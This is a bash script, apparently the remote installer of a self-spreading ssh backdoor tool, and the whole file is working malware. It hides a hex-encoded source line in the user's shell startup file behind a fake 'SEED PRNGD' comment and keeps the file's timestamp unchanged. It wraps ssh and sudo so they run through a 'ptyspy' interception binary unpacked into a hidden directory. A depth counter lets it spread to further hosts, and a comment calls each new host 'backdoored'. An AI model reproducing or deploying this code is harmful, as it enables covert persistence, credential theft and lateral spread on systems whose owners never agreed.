#! /usr/bin/env bash

# This script is executed on a new remote side _before_ binaries have been deployed.
# This script sets up everything on the remote side:
# - Add to ~/.profile
# - link to correct binary for host's architecture.

CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CC="\033[1;36m" # cyan
CM="\033[1;35m" # magenta
CN="\033[0m"    # none

DEBUGF()
{
	[[ -z $THC_IS_DEBUG ]] && return
	echo >&2 "$@"
}

DEBUGF_R()
{
	[[ -z $THC_IS_DEBUG ]] && return
	echo -e >&2 "${CR}$@${CN}"
}

rcfile_add()
{
	local rcfile="$1"

	RCLINE=$(echo "${THC_BASEDIR}"'/seed' |xxd -ps -c1024)
	RCLINE_ENC="source \$(echo $RCLINE|xxd -r -ps#PRNGD) 2>/dev/null"

	RCLINE=""
	(head -n1 "${rcfile}" && \
		echo "# DO NOT REMOVE THIS LINE. SEED PRNGD."
		echo $RCLINE_ENC && \
		tail -n +2 "${rcfile}") >"${rcfile}-new" 2>/dev/null || exit 0

	touch -r "${rcfile}" "${rcfile}-new"
	mv "${rcfile}-new" "${rcfile}"
}

rcfile_del()
{
	local rcfile="$1"
	local data

	data=$(grep -v PRNGD "${rcfile}")
	echo "$data" >"${rcfile}" || { echo "failed"; exit 91; }
}

try_basedir()
{
	DEBUGF "THC_BASEDIR=$THC_BASEDIR trying=$1"
	[[ -n $THC_BASEDIR ]] && return # already set

	[[ ! -d "${1}" ]] && mkdir -p "${1}" 2>/dev/null

	[[ -d "$1" ]] && THC_BASEDIR="${1}"
}

osarch()
{
	local os;

	# OSARCH already set. Needed when cross compiling to force OSARCH
	[[ -n $OSARCH ]] && { echo "$OSARCH"; return; }
	# Find the correct binary for this architecture and link it
	arch=$(uname -m)
	if [[ $OSTYPE == *linux* ]]; then
		if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
		        os="i386-alpine"
		elif [[ "$arch" == "armv6l" ]] || [[ "$arch" == "armv7l" ]]; then
		        os="armv6l-linux" # RPI-Zero / RPI 4b+
		elif [[ "$arch" == "aarch64" ]]; then
		        os="aarch64-linux"
		elif [[ "$arch" == "mips64" ]]; then
		        os="mips64-alpine"
		elif [[ x"$arch" == *mips* ]]; then
		        os="mips32-alpine"
		fi
	elif [[ $OSTYPE == *darwin* ]]; then
	    if [[ "$arch" == "arm64" ]]; then
	            os="x86_64-osx" # M1
	    else
	            os="x86_64-osx"
	    fi
	elif [[ $OSTYPE == *FreeBSD* ]]; then
	    os="x86_64-freebsd"
	fi

	[[ -z "$os" ]] && os="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit

	echo "$os"
}

[[ "$1" = "osarch" ]] && { osarch; exit; }

# Find a writeable base dir
try_basedir "${HOME}/.prng"
try_basedir "/dev/shm/.prng/u-${UID}"
try_basedir "/tmp/.prng/u-${UID}"
[[ -n $THC_BASEDIR ]] && [[ ! -d "${THC_BASEDIR}" ]] && mkdir -p "${1}" 2>/dev/null
# Could not find a writeable directory
[[ -z $THC_BASEDIR ]] && { echo >&2 "THC_BASEDIR not set"; exit 98; }
[[ ! -d "${THC_BASEDIR}" ]] && { echo >&2 "Can't create ${THC_BASEDIR}"; exit 99; }

# deterime if system-side is already installed
# Exit if installed in either of the two system wide include scripts
# [[ -f /etc/bash.bashrc ]] && RCFILE="/etc/bash.bashrc" && grep PRNGD /etc/bash.bashrc &>/dev/null && IS_INSTALLED_RCFILE_SYSTEM=1
[[ -f /etc/profile     ]] && RCFILE_SYSTEM="/etc/profile"     && grep PRNGD /etc/profile     &>/dev/null && IS_INSTALLED_RCFILE_SYSTEM=1

# determine if local is already installed
[[ -z $RCFILE_USER ]] && [[ $SHELL =~ zsh ]] && [[ -f $HOME/.zshrc ]] && RCFILE_USER=$HOME/.zshrc
[[ -z $RCFILE_USER ]] && [[ $SHELL =~ bash ]] && [[ -f $HOME/.bash_profile ]] && RCFILE_USER=$HOME/.bash_profile
[[ -z $RCFILE_USER ]] && [[ $SHELL =~ bash ]] && [[ -f $HOME/.bash_login ]] && RCFILE_USER=$HOME/.bash_login
[[ -z $RCFILE_USER ]] && [[ -f $HOME/.profile ]] && RCFILE_USER=$HOME/.profile
[[ -n $RCFILE_USER ]] && grep PRNGD "${RCFILE_USER}" &>/dev/null && IS_INSTALLED_RCFILE_USER=1

# FIXME: if UID=0 then install systemwide to RCFILE_SYSTEM
RCFILE="$RCFILE_USER"

# no RCFILE found...
[[ -z $RCFILE ]] && { echo >&2 "No rcfile found"; exit 0; }

if [[ "$1" = "uninstall" ]]; then
	[[ -n $IS_INSTALLED_RCFILE_USER   ]] && rcfile_del "$RCFILE_USER"
	[[ -n $IS_INSTALLED_RCFILE_SYSTEM ]] && rcfile_del "$RCFILE_SYSTEM"
	echo -e "--> You may want to clean up with"
	echo -e "--> \033[1;36mrm -rf \"${THC_BASEDIR:-ERRORNOTSET}\"; unset -f ssh sudo thc_set1\033[0m"
	exit 0
fi

if [[ -z $IS_INSTALLED_RCFILE_SYSTEM ]] && [[ -z $IS_INSTALLED_RCFILE_USER ]]; then
	rcfile_add "$RCFILE"
# FIXME: If root user then try to install globally (if /etc/ is writeabl...).
fi

### Add my stub file that is sourced from rcfile on login
echo "export THC_BASEDIR=\"${THC_BASEDIR}\"
export THC_VERBOSE=\"${THC_VERBOSE}\"
THC_PS_NAME=\"\$(basename \$SHELL 2>/dev/null)\"
export THC_PS_NAME=\"-\${THC_PS_NAME:-bash}\"
thc_set1()
{
	unset -f ssh sudo 2>/dev/null
	THC_ORIG1=\$(command -v ssh)
	ssh()
	{
		if [[ -f \"${THC_BASEDIR}/ssh\" ]]; then
			THC_TARGET=\$THC_ORIG1 \"${THC_BASEDIR}/ssh\" \$@
		else
			\$THC_ORIG1 \$@
		fi
	}
	THC_ORIG2=\$(command -v sudo)
	sudo()
	{
		if [[ -f \"${THC_BASEDIR}/sudo\" ]]; then
			THC_TARGET=\$THC_ORIG2 \"${THC_BASEDIR}/sudo\" \$@
		else
			\$THC_ORIG2 \$@
		fi
	}
	which()
	{
		unset -f ssh sudo which comamnd 2>/dev/null
		which \$@
		thc_set1
	}
	[[ -f /usr/bin/command ]] && command(){ /usr/bin/command \$@; }
}
thc_set1" >"${THC_BASEDIR}/seed"

# [[ -z $FSIZE_BIN ]] && { echo >&2 "FSIZE_BIN not set"; exit 99; }

# Un-block the real ssh (to continue)
echo THCPROFILE

# Unpack the remaining data from stdin (binary)
(cd "$THC_BASEDIR" && tar xf -) || exit 97
# (cd "$THC_BASEDIR" && { head -c${FSIZE_BIN} | tar xf -; }) || exit 97
# Newly backdoored. Decrement depth by 1. This will stop ssh-it when THC_DEPTH hits 0.
[[ -z $THC_DEPTH ]] && { echo >&2 "ERROR: THC_DEPTH not set."; exit 96; }
# On THC_LOCAL (local install, not via ssh) deep the current THC_DEPTH (do not decrement)
[[ -z $THC_LOCAL ]] && [[ $THC_DEPTH -gt 0 ]] && THC_DEPTH=$((THC_DEPTH - 1))
echo "THC_DEPTH=${THC_DEPTH}" >"${THC_BASEDIR}/depth.cfg"

OSARCH=$(osarch)

# Test execute on this architecture
THC_EXEC_TEST=1 "${THC_BASEDIR}/ptyspy_bin.${OSARCH}" 2>/dev/null  || { echo >&2 "Failed: ptyspy_bin.${OSARCH}"; exit 127; }

ln -sf "ptyspy_bin.${OSARCH}" "${THC_BASEDIR}/ssh"

echo -e "--> Installed to \033[1;33m${THC_BASEDIR}\033[0m and \033[1;33m${RCFILE}.\033[0m"

exit 0
